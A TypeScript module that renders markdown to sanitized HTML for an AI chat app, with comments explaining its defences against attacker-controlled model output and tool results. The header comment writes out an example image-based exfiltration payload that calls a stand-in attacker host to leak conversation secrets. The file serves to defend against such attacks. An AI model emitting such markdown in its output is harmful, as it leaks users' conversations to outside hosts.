/**
 * Markdown → sanitized HTML. The only place either step happens.
 *
 * Every string this renders is attacker-reachable. Model output is the obvious
 * case, but a tool result is worse: it carries whatever a fetched web page, an
 * inbound email or a third-party API said, and an attacker who can influence
 * any of those can write markdown into this pipeline. Before this existed, six
 * call sites piped `marked.parse()` straight into `dangerouslySetInnerHTML`
 * with no sanitizer anywhere in the repo.
 *
 * Two defences, because they cover different things:
 *
 * 1. **This sanitizer** strips scripts, event handlers and every URL scheme
 *    that is not plainly safe. It runs in the page, so it also protects a
 *    deployment whose CSP header was stripped by a proxy.
 *
 * 2. **The Content-Security-Policy** the server sends (`img-src 'self' data:`)
 *    stops a remote image from loading at all. This is the one that closes the
 *    *exfiltration* channel rather than the script channel: `![](http://attacker/?q=secret)`
 *    needs no JavaScript, and a page that renders it leaks the surrounding
 *    conversation to whoever owns that host simply by fetching the picture.
 *
 * Neither alone is enough. The sanitizer allows images, because showing images
 * is the entire point of the media feature; the CSP is what makes allowing them
 * safe.
 */

import DOMPurify from "dompurify";
import { marked } from "marked";

/**
 * Tags a conversation can legitimately contain. Deliberately no `<style>`,
 * `<iframe>`, `<object>`, `<embed>`, `<form>` or `<input>`: a message has no
 * business restyling the app, framing another origin, or asking for a password.
 */
const ALLOWED_TAGS = [
  "p",
  "br",
  "hr",
  "span",
  "div",
  "strong",
  "em",
  "b",
  "i",
  "u",
  "s",
  "del",
  "ins",
  "mark",
  "small",
  "sub",
  "sup",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "ul",
  "ol",
  "li",
  "blockquote",
  "pre",
  "code",
  "a",
  "img",
  "table",
  "thead",
  "tbody",
  "tfoot",
  "tr",
  "th",
  "td",
  // TAI's own chat tags, swapped for interactive chips after this runs.
  "task",
  "agent",
  "note",
  "file",
  "proposal",
  "ask",
];

const ALLOWED_ATTR = [
  "href",
  "title",
  "target",
  "rel",
  "src",
  "alt",
  "width",
  "height",
  "loading",
  "class",
  "colspan",
  "rowspan",
  "start",
  // Attributes the chip parser reads off TAI's custom tags.
  "id",
  "name",
  "path",
  "status",
  "to",
];

/** Configured once. DOMPurify is stateful per-call, so the hooks go on once too. */
let configured = false;

function configure(): void {
  if (configured) return;
  configured = true;

  // Was set at module scope in four separate components, which meant the
  // rendering of a document depended on which of them happened to import
  // first. One renderer, one configuration.
  marked.setOptions({ breaks: true, gfm: true });

  DOMPurify.addHook("afterSanitizeAttributes", (node) => {
    // Any link that survives leaves this tab in a new context with no handle
    // back to it. `noopener` is the security half (window.opener lets the
    // opened page navigate this one); `noreferrer` stops the URL of whatever
    // the user was reading from being handed to a third party.
    if (node.tagName === "A" && node.hasAttribute("href")) {
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer");
    }
    // Lazy by default: an image far down a long transcript should not be
    // fetched until it is looked at.
    if (node.tagName === "IMG") {
      node.setAttribute("loading", "lazy");
      if (!allowRemoteImages && isRemote(node.getAttribute("src"))) {
        // Remote image sources are dropped HERE rather than through
        // `ALLOWED_URI_REGEXP`, because that filter cannot tell one attribute
        // from another and blocking `https:` there also strips every external
        // hyperlink — which an earlier version of this file did.
        //
        // The two are genuinely different risks. A link is navigation the user
        // chooses, and `noreferrer` covers what it leaks. An image `src` is an
        // automatic outbound request the moment the message renders, which is
        // what makes it an exfiltration primitive.
        node.removeAttribute("src");
        node.setAttribute("alt", node.getAttribute("alt") || "[remote image blocked]");
      }
    }
  });
}

/** True for a URL that would cause a fetch to another origin. */
function isRemote(url: string | null): boolean {
  if (!url) return false;
  return /^(?:https?:)?\/\//i.test(url.trim());
}

/**
 * Whether the current sanitize pass permits remote images.
 *
 * Module-scoped because DOMPurify hooks take no per-call context. Set
 * immediately before each `sanitize()` and read inside the hook; there is no
 * await between the two, so no interleaving is possible.
 */
let allowRemoteImages = false;

export interface RenderMarkdownOptions {
  /**
   * Allow images from any origin.
   *
   * Off by default, and the default is the one that matters: an image URL is a
   * silent outbound request carrying a referrer, so a remote `<img>` in
   * model-authored text is an exfiltration primitive that needs no JavaScript.
   * Same-origin and `data:` images still render — which covers everything TAI
   * serves from its own media store.
   */
  allowRemoteImages?: boolean;
}

/** Render markdown to HTML that is safe to inject. */
export function renderMarkdown(source: string, opts: RenderMarkdownOptions = {}): string {
  configure();
  const html = marked.parse(source ?? "", { async: false }) as string;
  return sanitizeHtml(html, opts);
}

/** Sanitize HTML from somewhere else (already-rendered markdown, a chip fragment). */
export function sanitizeHtml(html: string, opts: RenderMarkdownOptions = {}): string {
  configure();
  allowRemoteImages = opts.allowRemoteImages ?? false;
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // Schemes, not origins. `javascript:` and friends never survive and `data:`
    // is confined to images; `https:` is allowed so hyperlinks keep working,
    // and remote *image* sources are removed by the hook above instead.
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|data:image\/|\/|#|\.|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
    // Keep the custom chat tags rather than unwrapping them.
    ADD_TAGS: ["task", "agent", "note", "file", "proposal", "ask"],
    // `srcset` would reintroduce remote fetches the URI filter just removed.
    FORBID_ATTR: ["srcset", "style", "formaction", "ping"],
    RETURN_TRUSTED_TYPE: false,
  });
}
